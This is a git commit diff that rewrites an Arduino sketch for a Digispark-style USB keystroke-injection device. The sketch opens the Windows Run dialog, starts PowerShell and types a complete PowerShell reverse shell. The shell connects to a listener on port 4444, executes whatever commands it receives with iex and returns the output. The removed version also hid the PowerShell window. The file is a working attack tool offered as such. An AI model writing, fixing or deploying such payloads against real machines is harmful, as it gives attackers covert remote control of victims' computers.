2cc3e65391c1fda1ca5e019d5ba378c4f4ec4cb2
5e1c1567 <gummykittens19@gmail.com>
2026-04-29 18:22:13 +0000

    Fix entire reverse_shell_windows.ino

--- reverse_shell_windows.ino
+++ reverse_shell_windows.ino
@@ -1,29 +1,26 @@
+#include "DigiKeyboard.h"
+
+void setup() {
+
+  DigiKeyboard.update();
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.sendKeyStroke(0);
+  // Press Windows Key + R to open the Run dialog
+  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
+
+  DigiKeyboard.delay(1000);
+
+  DigiKeyboard.print("powershell.exe");
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
+
+  DigiKeyboard.delay(1000);
+
+  // Normally we would type this out in the Run dialog, but the Run dialog has a maximum of 259 characters and this is way over
+  DigiKeyboard.print(F("$c=New-Object System.Net.Sockets.TCPClient('127.0.0.1',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()"));
+  DigiKeyboard.sendKeyStroke(KEY_ENTER);
 
 
-  #include "DigiKeyboard.h"
+}
 
-  String IPPORT = F("'10.0.0.100',4444");
-
-  String POWERSHELL_COMMAND;
-
-  void setup() {
-
-    POWERSHELL_COMMAND = R"$c=New-Object System.Net.Sockets.TCPClient('" + IPPORT + ");$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS> ';$sb3=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sb3,0,$sb3.Length);$s.Flush()};$c.Close()";
-
-    DigiKeyboard.delay(1000);
-
-    DigiKeyboard.sendKeyStroke(0);
-    // Press Windows Key + R to open the Run dialog
-    DigiKeyboard.sendKeyStroke(MOD_GUI_LEFT, KEY_S);
-
-    DigiKeyboard.delay(600);
-
-    DigiKeyboard.sendKeyStroke("powershell.exe WindowStyle Hidden -Command " + POWERSHELL_COMMAND);
-    DigiKeyboard.sendKeyStroke(KEY_ENTER);
-
-
-  }
-
-  void loop() {}
-
-
+void loop() {}
